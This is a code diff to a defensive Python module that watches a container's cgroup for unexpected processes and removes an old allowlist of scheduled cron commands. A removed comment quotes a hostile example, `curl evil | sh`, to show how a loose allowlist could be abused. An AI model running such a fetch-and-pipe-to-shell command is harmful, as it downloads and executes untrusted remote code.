@@ -1,18 +1,27 @@
 """Watch this container for a process that should not be in it, and refuse to
 keep running if one appears.
 
-`backend/execguard.py` is the prevention and it is the stronger half: a seccomp
-filter cannot be raced, and nothing this module does would catch an `execve`
-that the filter already killed. This is the half that covers what the filter
-cannot -- the processes it was never installed in. In the mail role those are
-real: the entrypoint shell, supercronic, and the shells and interpreters
-supercronic starts on a schedule. In every other role there are none, which
-makes the rule for four of the five containers exactly "one process, mine".
+`execguard.py` is the prevention and it is the stronger half: a seccomp filter
+cannot be raced, and nothing this module does would catch an `execve` that the
+filter already killed. This is the backstop under it, and the rule it enforces
+is one line -- every container runs one process, and that process is the one
+reading this.
 
-So this is not a monitor standing in for a control. It is the answer to "what
-if somebody got in anyway", which is a question a measured image still has to
-answer, and answering it with silence was the gap. A process that appears here
-is a breach, and a breach that nobody hears about is the expensive kind.
+The rule used to have an exception. The mail role ran supercronic beside the
+daemon and a shell per scheduled job, and those were processes the filter was
+never installed in, so this module carried an allowlist of what the crontab was
+permitted to be running. `backend/daemons/scheduler.py` moved the schedule onto
+a thread and the exception went with it: there is no child process in any role
+now, so there is nothing to allow.
+
+That leaves this module covering the case the filter cannot: not being there.
+`lock_down` is fatal under TEE_REQUIRED and a warning otherwise, so a kernel or
+a runtime that refuses the filter is a process that can still `execve` -- and a
+container nobody prevented anything in is exactly the one worth watching. It is
+also the answer to "what if somebody got in anyway", which a measured image
+still has to answer, and answering it with silence was the gap. A process that
+appears here is a breach, and a breach that nobody hears about is the expensive
+kind.
 
 The pid list comes from the cgroup rather than from a scan of `/proc`, because
 the cgroup is exactly this container's processes and `/proc` is whatever the
@@ -36,8 +45,8 @@ service, the container loops visibly instead of serving quietly, which is the
 intended failure.
 
 Cost, stated rather than discovered: a false positive takes a container down.
-That is why the expected set is exact for four roles, and why the one role with
-a legitimately moving set re-reads a pid before refusing on it.
+That is the price of an exact expected set, and the set is exact because a role
+that legitimately starts processes cannot have one.
 """
 
 from __future__ import annotations
@@ -60,33 +69,6 @@ POLL_SECONDS = 2.0
 # tell "this container refused a process" from "this service raised".
 EXIT_INTRUSION = 99
 
-# The one role whose container legitimately holds more than one process:
-# flake.nix starts supercronic beside the daemon, and supercronic starts a
-# shell per job. Every other role's entrypoint `exec`s its interpreter, so the
-# service is pid 1 and there is nothing else to allow.
-SCHEDULING_ROLE = "mail"
-
-# What supercronic is allowed to be running, as the module each crontab line
-# ends in. Kept in step with the crontab in flake.nix by
-# `tests/test_procwatch.py`, which reads both this and
-# `deploy/render_image_manifest.ROLE_ROOTS` -- a job added to the schedule and
-# not here is a container that kills itself at 05:00.
-SCHEDULED_MODULES = (
-    "backend.drafting.email_summary",
-    "backend.onboarding.watch_renew",
-    "backend.billing.billing_poller",
-)
-
-# The shell command supercronic runs for each of those, character for character
-# as flake.nix writes the crontab. Matched whole rather than by suffix: a rule
-# that accepted any command *ending* in a scheduled module accepts
-# `sh -c 'curl evil | sh; echo backend.billing.billing_poller'`, which is a
-# permitted process spelled out of the allowlist's own vocabulary.
-SCHEDULED_COMMANDS = frozenset(
-    f"cd /app && python -m {module}" for module in SCHEDULED_MODULES)
-
-CRONTAB_PATH = "/app/crontab"
-
 SERVICE_MODULES = {
     "mail": "backend.daemons.daemon_loop",
     "web": "frontend.web_server",
@@ -99,20 +81,14 @@ SERVICE_MODULES = {
 def role_of(module):
     """The role whose service is this module, keyed by the name `python -m` was
     given. Entry points call `role_of(__spec__.name)` rather than naming their
-    own role, so a container cannot come to watch itself against another role's
-    expected set -- which for four of the five roles is the difference between
-    "one process" and "one process plus a scheduler"."""
+    own role, so the role a container watches itself as is the module that was
+    actually started rather than a string a compose file supplied."""
     for role, name in SERVICE_MODULES.items():
         if name == module:
             return role
     raise AssertionError(
         f"{module!r} is not any role's service module; add it to "
         "SERVICE_MODULES or it will be watched as nothing")
-
-
-ENTRYPOINT_NAME = "email-bot-entrypoint"
-SUPERCRONIC_NAME = "supercronic"
-SHELLS = ("sh", "bash", "dash")
 
 
 class IntrusionRefused(Exception):
@@ -186,60 +162,16 @@ def cmdline(pid):
     return [part.decode("utf-8", "replace") for part in raw.split(b"\0") if part]
 
 
-def _runs_module(argv, allowed):
-    """Whether argv is an interpreter started as `python -m <one of allowed>`.
+def expected(pid):
+    """Whether this process belongs in this container. Exactly one does.
 
-    The module is read from the position after `-m` rather than searched for
-    anywhere in argv, so a payload that merely mentions the name in an argument
-    does not pass."""
-    for index, arg in enumerate(argv[:-1]):
-        if arg == "-m":
-            return argv[index + 1] in allowed
-    return False
-
-
-def _is_scheduled_shell(argv):
-    """A `sh -c` wrapper supercronic puts around a crontab line.
-
-    The command has to be one of `SCHEDULED_COMMANDS` exactly. Anything looser
-    -- a suffix match, a substring -- lets a shell run whatever it likes as long
-    as the string ends the right way, which is an allowlist an attacker writes
-    the other half of."""
-    if len(argv) != 3 or argv[1] != "-c":
-        return False
-    if os.path.basename(argv[0]).lstrip("-") not in SHELLS:
-        return False
-    return argv[2].strip() in SCHEDULED_COMMANDS
-
-
-def _is_binary(argv, name):
-    """argv[0] is that program, by basename off an absolute path. `in argv[0]`
-    would take any path with the name somewhere inside it."""
-    return bool(argv) and (argv[0] == name or argv[0].endswith("/" + name))
-
-
-def expected(role, pid, argv):
-    """Whether this process belongs in this role's container.
-
-    Four of the five roles `exec` their interpreter, so the whole answer is
-    "it is us". The mail role also runs the entrypoint that started it,
-    supercronic, and whatever supercronic is currently running from the
-    crontab.
-
-    The role's own service module is deliberately not in the allowed set: this
-    watcher runs inside that process, so it is already answered by the pid, and
-    allowing the name would allow a *second* daemon nobody started."""
-    if pid == os.getpid():
-        return True
-    if role != SCHEDULING_ROLE or not argv:
-        return False
-    if _is_binary(argv, ENTRYPOINT_NAME):
-        return True
-    if _is_binary(argv, SUPERCRONIC_NAME):
-        return argv[1:] == [CRONTAB_PATH]
-    if _runs_module(argv, SCHEDULED_MODULES):
-        return True
-    return _is_scheduled_shell(argv)
+    Identity by pid and never by name. The role's own service module is
+    deliberately not an accepted argv: this watcher runs inside that process,
+    so it is already answered by the pid, and accepting the name would accept a
+    *second* daemon nobody started. Nothing else is accepted at all, which is
+    what removes the argv-matching this function used to do -- every allowlist
+    of command lines is one an attacker gets to write half of."""
+    return pid == os.getpid()
 
 
 def check(role):
@@ -249,15 +181,14 @@ def check(role):
     assert role in SERVICE_MODULES, f"unknown role {role!r}"
     unexpected = []
     for pid in sorted(live_pids()):
-        argv = cmdline(pid)
-        if expected(role, pid, argv):
+        if expected(pid):
             continue
-        if argv is None and not (PROC / str(pid)).exists():
-            # It ended between the listing and the read. Only the role that
-            # legitimately starts processes gets the benefit of that doubt;
-            # anywhere else a pid that existed at all is the finding.
-            if role == SCHEDULING_ROLE:
-                continue
+        # No benefit of the doubt for a pid that vanished between the listing
+        # and the read. That allowance existed for the mail role's scheduled
+        # jobs, which really did start and end three times a day; nothing
+        # starts a process here now, so a pid that existed at all is the
+        # finding whether or not it is still there to be named.
+        argv = cmdline(pid)
         unexpected.append({"pid": pid,
                            "cmdline": " ".join(argv) if argv else "<unreadable>"})
     if unexpected:
